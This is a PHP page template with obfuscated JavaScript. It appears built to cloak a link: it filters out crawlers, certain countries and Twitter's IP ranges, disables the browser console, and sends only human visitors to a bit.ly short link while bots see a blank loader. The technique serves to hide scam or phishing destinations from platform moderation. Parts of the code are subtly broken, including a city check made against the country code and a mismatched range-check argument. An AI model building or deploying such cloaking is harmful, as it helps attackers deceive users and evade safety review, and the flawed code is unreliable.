<?php

// Create a https://bitly.com/ url and paste the url here
$MY_BITY_URL = 'https://bit.ly/3gDNfri';
// Get a free API token from https://ipstack.com/
$MY_IP_STACK_TOKEN = 'XXXXXXXXX';
// Example 'PH' for Phillipines
$BLOCKED_COUNTRY_CODES = ['PH'];
// Example 'San Francisco'
$BLOCKED_CITY_NAMES = ['San Francisco'];
// Example Twitter https://ipinfo.io/AS35995
$BLOCKED_IP_RANGES = [
	'185.45.4.0/23',
	'185.45.4.0/24',
	'192.133.78.0/23',
	'8.25.194.0/23',
	'8.25.195.0/24',
	'8.25.196.0/23',
	'8.25.196.0/24'
];
?>

<?php
// Don't modify below this point unless you know what you are doing
$blocked = false;
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
	$ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
	$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
	$ip = $_SERVER['REMOTE_ADDR'];
}
if ($MY_IP_STACK_TOKEN) {
	$ipstack = json_decode(file_get_contents(sprintf('http://api.ipstack.com/%s?access_key=%s', $ip, $MY_IP_STACK_TOKEN)));
	if ($ipstack) {
		if ($ipstack->security->is_crawler) {
			$blocked = true;
		}
		if (isset($BLOCKED_COUNTRY_CODES) && is_array($BLOCKED_COUNTRY_CODES) && in_array($ipstack->country_code, $BLOCKED_COUNTRY_CODES)) {
			$blocked = true;
		}
		if (isset($BLOCKED_CITY_NAMES) && is_array($BLOCKED_CITY_NAMES) && in_array($ipstack->country_code, $BLOCKED_CITY_NAMES)) {
			$blocked = true;
		}
		if (isset($BLOCKED_IP_RANGES) && is_array($BLOCKED_IP_RANGES) && ip_in_range($ip, $BLOCKED_IP_RANGES)) {
			$blocked = true;
		}
	}
}
function ip_in_range($ip, $range) {
	if (strpos($range, '/') == false) {
		$range .= '/32';
	}
	// $range is in IP/CIDR format eg 127.0.0.1/24
	list($range, $netmask) = explode('/', $range, 2);
	$ip_decimal       = ip2long($ip);
	$range_decimal    = ip2long($range);
	$wildcard_decimal = pow(2, (32 - $netmask)) - 1;
	$netmask_decimal  = ~$wildcard_decimal;
	return (($ip_decimal & $netmask_decimal) == ($range_decimal & $netmask_decimal));
}
?>
<?php if (!$blocked) { ?>
	<style type="text/css">
		<?php echo "#loader{height:100%;width:100%;position:fixed;z-index:999;top:0;left:0;background-color:rgb(255,255,255);overflow-x:hidden}.loading{position:absolute;left:50%;top:50%;height:40px;width:40px;margin:0px auto;-webkit-animation:rotation .6s infinite linear;-moz-animation:rotation .6s infinite linear;-o-animation:rotation .6s infinite linear;animation:rotation .6s infinite linear;border-left:6px solid rgba(0,174,239,.15);border-right:6px solid rgba(0,174,239,.15);border-bottom:6px solid rgba(0,174,239,.15);border-top:6px solid rgba(0,174,239,.8);border-radius:100%}@-webkit-keyframes rotation{from{-webkit-transform:rotate(0deg)}to{-webkit-transform:rotate(359deg)}}@-moz-keyframes rotation{from{-moz-transform:rotate(0deg)}to{-moz-transform:rotate(359deg)}}@-o-keyframes rotation{from{-o-transform:rotate(0deg)}to{-o-transform:rotate(359deg)}}@keyframes rotation{from{transform:rotate(0deg)}to{transform:rotate(359deg)}}"; ?>
	</style>
	<script type="text/javascript">
		var _0x1767=['removeChild','trace','info','warn','error','return\x20(function()\x20','log','test','apply','debug','DOMContentLoaded','table','addEventListener','display','none','location','replace','{}.constructor(\x22return\x20this\x22)(\x20)','(googlebot/|bot|Googlebot-Mobile|Googlebot-Image|Google\x20favicon|Mediapartners-Google|bingbot|slurp|java|wget|curl|Commons-HttpClient|Python-urllib|libwww|httpunit|nutch|phpcrawl|msnbot|jyxobot|FAST-WebCrawler|FAST\x20Enterprise\x20Crawler|biglotron|teoma|convera|seekbot|gigablast|exabot|ngbot|ia_archiver|GingerCrawler|webmon\x20|httrack|webcrawler|grub.org|UsineNouvelleCrawler|antibot|netresearchserver|speedy|fluffy|bibnum.bnf|findlink|msrbot|panscient|yacybot|AISearchBot|IOI|ips-agent|tagoobot|MJ12bot|dotbot|woriobot|yanga|buzzbot|mlbot|yandexbot|purebot|Linguee\x20Bot|Voyager|CyberPatrol|voilabot|baiduspider|citeseerxbot|spbot|twengabot|postrank|turnitinbot|scribdbot|page2rss|sitebot|linkdex|Adidxbot|blekkobot|ezooms|dotbot|Mail.RU_Bot|discobot|heritrix|findthatfile|europarchive.org|NerdByNature.Bot|sistrix\x20crawler|ahrefsbot|Aboundex|domaincrawler|wbsearchbot|summify|ccbot|edisterbot|seznambot|ec2linkfinder|gslfbot|aihitbot|intelium_bot|facebookexternalhit|yeti|RetrevoPageAnalyzer|lb-spider|sogou|lssbot|careerbot|wotbox|wocbot|ichiro|DuckDuckBot|lssrocketcrawler|drupact|webcompanycrawler|acoonbot|openindexspider|gnam\x20gnam\x20spider|web-archive-net.com.bot|backlinkcrawler|coccoc|integromedb|content\x20crawler\x20spider|toplistbot|seokicks-robot|it2media-domain-crawler|ip-web-crawler.com|siteexplorer.info|elisabot|proximic|changedetection|blexbot|arabot|WeSEE:Search|niki-bot|CrystalSemanticsBot|rogerbot|360Spider|psbot|InterfaxScanBot|Lipperhey\x20SEO\x20Service|CC\x20Metadata\x20Scaper|g00g1e.net|GrapeshotCrawler|urlappendbot|brainobot|fr-crawler|binlar|SimpleCrawler|Livelapbot|Twitterbot|cXensebot|smtbot|bnf.fr_bot|A6-Indexer|ADmantX|Facebot|Twitterbot|OrangeBot|memorybot|AdvBot|MegaIndex|SemanticScholarBot|ltx71|nerdybot|xovibot|BUbiNG|Qwantify|archive.org_bot|Applebot|TweetmemeBot|crawler4j|findxbot|SemrushBot|yoozBot|lipperhey|y!j-asr|Domain\x20Re-Animator\x20Bot|AddThis)','overlay','exception','console'];(function(_0x2db2e0,_0x176797){var _0x27ee82=function(_0x276099){while(--_0x276099){_0x2db2e0['push'](_0x2db2e0['shift']());}};_0x27ee82(++_0x176797);}(_0x1767,0x124));var _0x27ee=function(_0x2db2e0,_0x176797){_0x2db2e0=_0x2db2e0-0x0;var _0x27ee82=_0x1767[_0x2db2e0];return _0x27ee82;};var _0x2ae4e8=function(){var _0x20de03=!![];return function(_0x5db0da,_0x4f6c3c){var _0x2575b9=_0x20de03?function(){if(_0x4f6c3c){var _0x752ab2=_0x4f6c3c[_0x27ee('0x2')](_0x5db0da,arguments);_0x4f6c3c=null;return _0x752ab2;}}:function(){};_0x20de03=![];return _0x2575b9;};}();var _0x17be11=_0x2ae4e8(this,function(){var _0x499817=function(){};var _0x1f8930;try{var _0x103d71=Function(_0x27ee('0x15')+_0x27ee('0xb')+');');_0x1f8930=_0x103d71();}catch(_0x2132a5){_0x1f8930=window;}if(!_0x1f8930[_0x27ee('0xf')]){_0x1f8930[_0x27ee('0xf')]=function(_0x4b7e5f){var _0x30e55d={};_0x30e55d[_0x27ee('0x0')]=_0x4b7e5f;_0x30e55d[_0x27ee('0x13')]=_0x4b7e5f;_0x30e55d[_0x27ee('0x3')]=_0x4b7e5f;_0x30e55d[_0x27ee('0x12')]=_0x4b7e5f;_0x30e55d[_0x27ee('0x14')]=_0x4b7e5f;_0x30e55d[_0x27ee('0xe')]=_0x4b7e5f;_0x30e55d[_0x27ee('0x5')]=_0x4b7e5f;_0x30e55d[_0x27ee('0x11')]=_0x4b7e5f;return _0x30e55d;}(_0x499817);}else{_0x1f8930['console']['log']=_0x499817;_0x1f8930[_0x27ee('0xf')][_0x27ee('0x13')]=_0x499817;_0x1f8930['console']['debug']=_0x499817;_0x1f8930[_0x27ee('0xf')][_0x27ee('0x12')]=_0x499817;_0x1f8930['console'][_0x27ee('0x14')]=_0x499817;_0x1f8930[_0x27ee('0xf')][_0x27ee('0xe')]=_0x499817;_0x1f8930[_0x27ee('0xf')][_0x27ee('0x5')]=_0x499817;_0x1f8930[_0x27ee('0xf')][_0x27ee('0x11')]=_0x499817;}});_0x17be11();var botPattern=_0x27ee('0xc');var botTest=new RegExp(botPattern,'i');var userAgent=navigator['userAgent'];if(!botTest[_0x27ee('0x1')](userAgent)){window[_0x27ee('0x9')][_0x27ee('0xa')]('https://bit.ly/<?php echo isset($MY_BITY_URL) ? $MY_BITY_URL : ''; ?>');}else{document[_0x27ee('0x6')](_0x27ee('0x4'),function(){var _0xe66d21=document['getElementById'](_0x27ee('0xd'));_0xe66d21['style'][_0x27ee('0x7')]=_0x27ee('0x8');_0xe66d21['parentNode'][_0x27ee('0x10')](_0xe66d21);});}
	</script>
<?php } ?>
